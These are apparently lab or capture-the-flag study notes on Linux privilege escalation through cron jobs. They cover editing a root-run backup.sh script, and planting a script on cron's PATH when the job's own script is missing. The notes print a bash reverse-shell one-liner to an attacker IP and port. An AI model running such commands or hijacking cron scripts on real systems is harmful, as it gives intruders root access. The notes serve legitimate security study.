Cron job run only with root permission and if we can change their data so we can run our commands using root permission.Cron job configurations are stored as crontabs (cron tables) to see the next time and date the task will run.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not.

anyone can read the file `/etc/crontab`

![](Pasted%20image%2020250703000534.png)

A cronjob run `backup.sh` file backup the data every minutes.

![](Pasted%20image%2020250703000647.png)

We can change the backup scrip to request for reverse shell on attacker system.

![](Pasted%20image%2020250703000910.png)

```bash
bash -i >& /dev/tcp/10.10.4.5/5454 0>&1
```

![](Pasted%20image%2020250703000920.png)

![](Pasted%20image%2020250703001201.png)

The example above shows a similar situation where the antivirus.sh script was deleted, but the cron job still exists.  
If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.

![](Pasted%20image%2020250703001333.png)

